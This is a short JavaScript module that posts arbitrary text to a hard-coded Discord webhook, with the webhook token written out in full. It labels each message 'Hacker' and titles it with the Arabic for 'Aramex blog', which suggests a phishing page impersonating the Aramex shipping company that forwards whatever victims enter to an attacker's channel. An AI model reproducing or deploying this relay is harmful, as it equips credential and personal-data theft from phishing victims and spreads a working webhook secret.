import axios from 'axios';


const TeleSned = () => {
     
    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة اراميكس ",
              description: des,
           },
          ],
    };

        await axios.post("https://discord.com/api/webhooks/1314267472156954714/6uWn48uauSR6Do-ombJMbeX2qodJlybD3VbTPTKiiLmnhHIS6OeaPXPXdcmj4lIs4ZhE",body) 
    }
  return {
    Send,
}
}

export default TeleSned;
